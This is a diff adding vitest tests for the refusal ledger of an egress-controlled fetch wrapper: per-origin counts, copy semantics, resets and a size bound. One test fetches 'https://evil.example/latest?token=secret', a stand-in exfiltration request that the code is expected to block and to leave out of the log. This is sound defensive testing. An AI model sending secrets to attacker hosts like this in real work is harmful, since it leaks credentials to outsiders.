@@ -4,7 +4,10 @@
  * request is held by class and origin BEFORE a timer starts or a socket
  * opens, a refusal is a typed `EgressDeniedError` and never reaches `fetch`,
  * a caller that names no class is held as `content`, and a standalone
- * authority answers allowed with nothing consulted.
+ * authority answers allowed with nothing consulted. The chokepoint also keeps
+ * the ledger of what it refused (MRC2-05-03): once per class, code and
+ * origin with a count, as copies, bounded, and started over with the
+ * authority.
  */
 
 import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
@@ -18,8 +21,10 @@ import {
 import {
 	EgressDeniedError,
 	fetchWithTimeout,
+	heldEgress,
 	isEgressDeniedError,
 	isFetchTimeoutError,
+	MAX_EGRESS_HOLDS,
 	setEgressAuthority,
 } from '../../../main/utils/fetchWithTimeout';
 
@@ -249,5 +254,87 @@ describe('fetchWithTimeout under an egress authority', () => {
 		await fetchWithTimeout(URL_UNDER_TEST);
 
 		expect(mockFetch).toHaveBeenCalledTimes(1);
+	});
+});
+
+describe('the ledger of holds (MRC2-05-03)', () => {
+	const realFetch = global.fetch;
+
+	afterEach(() => {
+		setEgressAuthority(null);
+		global.fetch = realFetch;
+	});
+
+	it('records a refusal once per class, code and origin with a count, and nothing for a request that left', async () => {
+		global.fetch = vi.fn().mockResolvedValue({ ok: true }) as unknown as typeof fetch;
+		setEgressAuthority(
+			managedSource({
+				policyRevision: 3,
+				classes: [{ class: 'updates', destinations: ['github.com'] }],
+			})
+		);
+
+		await fetchWithTimeout('https://github.com/releases/latest', {}, 1000, 'updates');
+		await expect(
+			fetchWithTimeout(URL_UNDER_TEST, {}, 1000, 'vendor-telemetry')
+		).rejects.toBeInstanceOf(EgressDeniedError);
+		await expect(
+			fetchWithTimeout(`${URL_UNDER_TEST}?run=2`, {}, 1000, 'vendor-telemetry')
+		).rejects.toBeInstanceOf(EgressDeniedError);
+		await expect(
+			fetchWithTimeout('https://evil.example/latest?token=secret', {}, 1000, 'updates')
+		).rejects.toBeInstanceOf(EgressDeniedError);
+
+		const held = heldEgress();
+		expect(held).toEqual([
+			expect.objectContaining({
+				class: 'vendor-telemetry',
+				code: 'class-denied',
+				origin: 'https://api.runmaestro.ai',
+				count: 2,
+			}),
+			expect.objectContaining({
+				class: 'updates',
+				code: 'destination-denied',
+				origin: 'https://evil.example',
+				count: 1,
+			}),
+		]);
+		expect(Date.parse(held[0].lastAt)).toBeGreaterThanOrEqual(Date.parse(held[0].firstAt));
+		const text = JSON.stringify(held);
+		expect(text).not.toContain('run=2');
+		expect(text).not.toContain('secret');
+		expect(global.fetch).toHaveBeenCalledTimes(1);
+	});
+
+	it('hands out copies and starts over when an authority is installed or removed', async () => {
+		global.fetch = forbiddenFetch() as unknown as typeof fetch;
+		setEgressAuthority(managedSource(null));
+		await expect(fetchWithTimeout(URL_UNDER_TEST)).rejects.toBeInstanceOf(EgressDeniedError);
+
+		const first = heldEgress();
+		expect(first).toEqual([
+			expect.objectContaining({ class: 'content', code: 'unavailable', count: 1 }),
+		]);
+		(first[0] as { count: number }).count = 99;
+		expect(heldEgress()[0].count).toBe(1);
+
+		setEgressAuthority(managedSource(null));
+		expect(heldEgress()).toEqual([]);
+		await expect(fetchWithTimeout(URL_UNDER_TEST)).rejects.toBeInstanceOf(EgressDeniedError);
+		setEgressAuthority(null);
+		expect(heldEgress()).toEqual([]);
+	});
+
+	it('keeps at most MAX_EGRESS_HOLDS distinct holds and still refuses past the bound', async () => {
+		global.fetch = forbiddenFetch() as unknown as typeof fetch;
+		setEgressAuthority(managedSource(null));
+		for (let i = 0; i < MAX_EGRESS_HOLDS + 3; i++) {
+			await expect(fetchWithTimeout(`https://host-${i}.example/`)).rejects.toBeInstanceOf(
+				EgressDeniedError
+			);
+		}
+		expect(heldEgress()).toHaveLength(MAX_EGRESS_HOLDS);
+		expect(global.fetch).not.toHaveBeenCalled();
 	});
 });
